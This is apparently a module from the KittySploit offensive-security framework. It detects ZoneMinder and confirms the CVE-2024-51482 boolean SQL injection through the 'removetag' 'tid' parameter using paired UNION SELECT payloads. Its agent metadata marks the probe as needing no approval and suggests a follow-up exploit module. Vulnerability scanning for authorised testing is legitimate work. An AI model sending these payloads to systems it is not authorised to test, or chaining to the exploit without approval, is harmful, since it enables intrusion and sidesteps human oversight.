#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ZoneMinder CVE-2024-51482 removetag SQLi surface (authenticated oracle)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "ZoneMinder CVE-2024-51482 SQLi Detect",
        "description": (
            "Fingerprints ZoneMinder and probes ajax/event removetag tid parameter "
            "(boolean SQLi requires a valid ZMSESSID)."
        ),
        "author": ["KittySploit Team"],
        "severity": "high",
        "cve": ["CVE-2024-51482"],
        "tags": ["web", "scanner", "zoneminder", "sqli", "cve-2024-51482"],
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2024-51482"],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 3,
            "reversible": True,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals"],
            "chain": {
                "suggested_followups": [
                    "exploits/multi/http/zoneminder_cve_2024_51482_sqli",
                ],
            },
        },
    }

    zm_path = OptString("/zm", "ZoneMinder base path", required=False)
    session_cookie = OptString("", "Optional ZMSESSID=... for boolean oracle", required=False)

    def _index(self) -> str:
        p = str(self.zm_path or "/zm").strip().rstrip("/")
        return (p if p.startswith("/") else f"/{p}") + "/index.php"

    def _apply_cookies(self) -> None:
        raw = str(self.session_cookie or "").strip()
        for part in raw.split(";"):
            part = part.strip()
            if "=" in part:
                k, v = part.split("=", 1)
                self.session.cookies.set(k.strip(), v.strip())

    def run(self):
        r = self.http_request("GET", self._index(), allow_redirects=True)
        body = (r.text or "").lower() if r else ""
        if "zoneminder" not in body and "zm" not in body:
            return False

        self._apply_cookies()
        if str(self.session_cookie or "").strip():
            true_p = {
                "view": "request",
                "request": "event",
                "action": "removetag",
                "tid": "0 UNION SELECT 1,2,3,4 WHERE (1=1)",
            }
            false_p = dict(true_p, tid="0 UNION SELECT 1,2,3,4 WHERE (1=2)")
            rt = self.http_request("GET", self._index(), params=true_p)
            rf = self.http_request("GET", self._index(), params=false_p)
            if rt and rf and rt.status_code == 200 and rf.status_code == 500:
                self.set_info(
                    severity="high",
                    cve="CVE-2024-51482",
                    reason="Boolean SQLi oracle on removetag tid",
                    confidence="high",
                )
                return True

        self.set_info(
            severity="medium",
            cve="CVE-2024-51482",
            reason="ZoneMinder detected; supply session_cookie for SQLi confirmation",
            confidence="medium",
        )
        return True
